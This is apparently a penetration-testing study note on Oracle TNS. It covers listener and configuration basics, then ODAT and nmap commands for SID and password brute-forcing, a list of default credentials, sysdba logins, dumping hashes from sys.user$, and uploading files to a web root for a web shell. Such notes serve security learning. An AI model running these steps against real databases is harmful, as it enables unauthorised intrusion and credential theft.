---
created: 2026-09-22
updated: 2026-10-09
tags:
  - services_n_protocols
---
## Oracle TNS

>**[Oracle Transparent Network Substrate (TNS)](https://docs.oracle.com/en/database/oracle/oracle-database/18/netag/introducing-oracle-net-services.html)** is the communication protocol of the Oracle Net Services suite that carries traffic between Oracle databases and client applications over a network.

- TNS was introduced as part of Oracle Net Services and supports several transport stacks, historically including `TCP/IP` and `IPX/SPX`, with later versions adding `IPv6` and `SSL/TLS`.
- It provides four broad functions for Oracle deployments:
	- **Name resolution** — mapping service names to network addresses.
	- **Connection management** — establishing and tearing down client sessions.
	- **Load balancing** — distributing connections across database instances.
	- **Security** — an encryption layer over TCP/IP for client-server traffic.
- TNS follows a **client-server model**:
	- The **TNS listener** runs on the database server, receives incoming connection requests, and forwards each to the correct database instance.
	- **Clients** such as [`sqlplus`](https://docs.oracle.com/en/database/oracle/oracle-database/19/sqpug/index.html), application drivers, and the [`odat`](https://github.com/quentinhardy/odat) attack tool connect to the listener by service name or SID.

>[!important] The Oracle TNS listener listens for incoming connections on **TCP port `1521`** by default, though this can be changed at installation or in the listener configuration.

>[!note] Oracle TNS could be remotely managed in Oracle 8i/9i, but not in Oracle 10g/11g. It commonly appears alongside other Oracle services such as Oracle DBSNMP, Oracle Application Server, and Oracle Enterprise Manager.

### Oracle TNS ports

| Port       | Protocol   | Description                                                                       |
| ---------- | ---------- | --------------------------------------------------------------------------------- |
| `1521/tcp` | oracle-tns | **Default TNS listener** that accepts client connections and routes them to a database instance. |

### Configuration files

- Oracle TNS is driven by two plaintext configuration files, usually located in `$ORACLE_HOME/network/admin`:
	- **`tnsnames.ora`** — a client-side file that resolves service names to network addresses.
	- **`listener.ora`** — a server-side file that defines the listener process, the addresses it binds to, and the database instances (SIDs) it serves.

- A `tnsnames.ora` entry names a service, its network location, and the service name clients use to connect:

```txt
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.10.11.5)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```

- A `listener.ora` file defines the listener and the instances it forwards requests to:

```txt
SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.example.com)(PORT = 1521))
      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
    )
  )
```

- Common parameters found in these files:

| Setting               | Description                                                                               |
| --------------------- | ----------------------------------------------------------------------------------------- |
| `DESCRIPTION`         | A descriptor that names the database and its connection type.                             |
| `ADDRESS`             | The network address of the database, including hostname and port.                         |
| `PROTOCOL`            | The network protocol used to communicate with the server.                                 |
| `PORT`                | The port number used to communicate with the server.                                      |
| `CONNECT_DATA`        | Connection attributes such as the service name or SID and the database instance identifier. |
| `INSTANCE_NAME`       | The name of the database instance the client connects to.                                 |
| `SERVICE_NAME`        | The name of the service the client connects to.                                           |
| `SERVER`              | The server type for the connection, such as dedicated or shared.                          |
| `USER`                | The username used to authenticate with the database server.                               |
| `PASSWORD`            | The password used to authenticate with the database server.                               |
| `SECURITY`            | The type of security applied to the connection.                                           |
| `VALIDATE_CERT`       | Whether to validate the certificate when using SSL/TLS.                                    |
| `SSL_VERSION`         | The SSL/TLS version used for the connection.                                               |
| `CONNECT_TIMEOUT`     | The time limit, in seconds, for the client to establish a connection.                     |
| `SQLNET.EXPIRE_TIME`  | The interval, in seconds, at which the client checks whether a connection has failed.     |
| `TRACE_LEVEL`         | The tracing level for the database connection.                                            |
| `LOG_FILE`            | The file where log information is stored.                                                  |

>[!note] Oracle databases can restrict PL/SQL access with a **PL/SQL Exclusion List (`PlsqlExclusionList`)** — a text file placed in `$ORACLE_HOME/sqldeveloper` that names PL/SQL packages or types to block from execution through the Oracle Application Server.

### System identifiers

- A **System Identifier (SID)** is a unique name for a single Oracle database instance; one host can run several instances, each with its own SID.
- A client specifies the SID in its connection string to select the instance it wants; if none is given, the default from `tnsnames.ora` is used, and an incorrect SID makes the connection fail.
- Because a valid SID is required to authenticate, discovering SIDs is an early enumeration goal against a TNS listener.


## Setting up tooling

### Installing ODAT

- The **[Oracle Database Attacking Tool (ODAT)](https://github.com/quentinhardy/odat)** is a Python tool that enumerates and exploits Oracle databases, covering SID guessing, password guessing, file transfer, and command execution.
- Install its build dependencies and the `cx_Oracle` driver, then clone and prepare ODAT:

```bash
sudo apt-get update
sudo apt-get install -y build-essential python3-dev libaio1 python3-scapy libgmp-dev
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
pip3 install cx_Oracle python-libnmap colorlog termcolor passlib pycryptodome openpyxl
```

- Confirm the installation runs:

```bash
./odat.py -h
```

### Installing sqlplus

- **`sqlplus`** (SQL*Plus) is Oracle's command-line client for connecting to and querying a database. Install it from the Oracle Instant Client package:

```bash
sudo apt install oracle-instantclient-sqlplus
```

>[!tip]+ If `sqlplus` fails with `error while loading shared libraries: libsqlplus.so`, register the client library path and refresh the linker cache:
> ```bash
> sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
> sudo ldconfig
> ```

- Verify the client version:

```bash
sqlplus -v
```

## Enumerating the TNS listener

### Port scanning and version detection

- Perform service version detection on the default TNS port:

```bash
sudo nmap -sV -p 1521 10.10.11.5 --open
```

| Option   | Description                                              |
| :------- | :------------------------------------------------------- |
| `-sV`    | Enable service version detection.                        |
| `-p`     | Specify the destination port to scan (`1521`).           |
| `--open` | Show only hosts with the port open.                      |

>[!example]+ Detecting the Oracle TNS listener
> ```
> PORT     STATE SERVICE    VERSION
> 1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
> ```

### Brute-forcing the SID

- Guess valid SIDs with the [`oracle-sid-brute`](https://nmap.org/nsedoc/scripts/oracle-sid-brute.html) NSE script:

```bash
sudo nmap -sV -p 1521 --script oracle-sid-brute 10.10.11.5 --open
```

>[!example]+ Recovering a SID with oracle-sid-brute
> ```
> PORT     STATE SERVICE    VERSION
> 1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
> | oracle-sid-brute:
> |_  XE
> ```

- Guess SIDs with `odat`:

```bash
./odat.py sidguesser -s 10.10.11.5 -p 1521
```

### Gathering information with ODAT

- Run every ODAT module against the target to enumerate SIDs, versions, accounts, and misconfigurations in one pass:

```bash
./odat.py all -s 10.10.11.5
```

| Option | Description                                             |
| :----- | :------------------------------------------------------ |
| `all`  | Run all ODAT modules against the target.               |
| `-s`   | Set the target server IP address or hostname.          |
| `-p`   | Set the target port (default `1521`).                  |
| `-d`   | Set the target SID (database instance).                |
| `-U`   | Set the database username.                             |
| `-P`   | Set the database password.                             |

>[!example]+ ODAT discovering valid credentials
> ```
> [+] Checking if target 10.129.204.235:1521 is well configured for a connection...
> [+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...
> [+] Valid credentials found: scott/tiger. Continue...
> ```

## Brute-forcing credentials

- With a SID in hand, guess database credentials using the ODAT `passwordguesser` module:

```bash
./odat.py passwordguesser -s 10.10.11.5 -d XE
```

- Known Oracle default credentials worth trying first:

| Account   | Password            | Notes                                            |
| --------- | ------------------- | ------------------------------------------------ |
| `scott`   | `tiger`             | Classic Oracle sample-schema account.            |
| `system`  | `CHANGE_ON_INSTALL` | Default on Oracle 9 (no default set on Oracle 10). |
| `dbsnmp`  | `dbsnmp`            | Default for the Oracle DBSNMP monitoring service. |

>[!note] See [[🛠️ Custom wordlists and rules]] for building targeted username and password lists to feed the `passwordguesser` module.

## Connecting to the database

- Connect to an instance with `sqlplus` using `user/password@host/SID`:

```bash
sqlplus scott/tiger@10.10.11.5/XE
```

- If the account holds the required privileges, connect as the System Database Administrator (`sysdba`) for full control of the instance:

```bash
sqlplus scott/tiger@10.10.11.5/XE as sysdba
```

| Option    | Description                                                                 |
| :-------- | :-------------------------------------------------------------------------- |
| `user/password` | Database login and password to authenticate with.                     |
| `@host/SID` | Target host and the SID of the instance to connect to.                    |
| `as sysdba` | Connect with the `SYSDBA` administrative role (when the login is permitted). |

>[!example]+ Logging in with sqlplus
> ```
> SQL*Plus: Release 19.0.0.0.0 - Production Version 19.6.0.0.0
>
> ERROR: ORA-28002: the password will expire within 7 days
>
> Connected to: Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
>
> SQL>
> ```

## Enumerating the database

- List the tables visible to the current user:

```sql
SELECT table_name FROM all_tables;
```

- Show the roles and privileges granted to the current user:

```sql
SELECT * FROM user_role_privs;
```

>[!note] A low-privileged login such as `scott` may still connect `as sysdba` if the DBA has granted it the privilege. Re-running `SELECT * FROM user_role_privs;` in a `sysdba` session confirms the elevated role membership (for example the `DBA` role held by `SYS`).

## Extracting password hashes

- With sufficient privileges, read the account password hashes from `sys.user$` for offline cracking:

```sql
SELECT name, password FROM sys.user$;
```

>[!example]+ Password hashes from sys.user$
> ```
> NAME                           PASSWORD
> ------------------------------ ------------------------------
> SYS                            FBA343E7D6C8BC9D
> SYSTEM                         B5073FE1DE351687
> OUTLN                          4A3BA55E08595C81
> ```

>[!note] See [[Hashcat]] and [[🛠️ Password cracking]] for cracking the recovered Oracle hashes offline.

## Executing commands and uploading files

- With valid credentials, the ODAT `utlfile` module writes a local file to a directory on the database server. Pointing it at a web root drops a payload the web server will serve:

```bash
./odat.py utlfile -s 10.10.11.5 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

| Option      | Description                                                        |
| :---------- | :---------------------------------------------------------------- |
| `utlfile`   | Use the `UTL_FILE` module for server-side file operations.        |
| `-U` / `-P` | Database username and password to authenticate with.              |
| `--sysdba`  | Connect with the `SYSDBA` role.                                   |
| `--putFile` | Upload a local file: `<remote_dir> <remote_name> <local_path>`.   |

- Common web-root paths to target when uploading a web shell:

| OS      | Path                 |
| ------- | -------------------- |
| Linux   | `/var/www/html`      |
| Windows | `C:\inetpub\wwwroot` |

>[!tip]+ Confirm the upload by requesting the file over HTTP:
> ```bash
> curl -X GET http://10.10.11.5/testing.txt
> ```

>[!warning] Start with an inert file (for example a plain text marker) to confirm the write path before uploading a live payload, so a functional web shell is not left exposed on the target longer than necessary.

## References and further reading

- [`Introducing Oracle Net Services — Oracle Documentation`](https://docs.oracle.com/en/database/oracle/oracle-database/18/netag/introducing-oracle-net-services.html)
- [`Local Naming Parameters (tnsnames.ora) — Oracle Documentation`](https://docs.oracle.com/cd/E11882_01/network.112/e10835/tnsnames.htm)
- [`ODAT — Oracle Database Attacking Tool`](https://github.com/quentinhardy/odat)
- [`SQL*Plus User's Guide and Reference — Oracle Documentation`](https://docs.oracle.com/en/database/oracle/oracle-database/19/sqpug/index.html)
- [`1521 - Pentesting Oracle TNS Listener — HackTricks`](https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener)
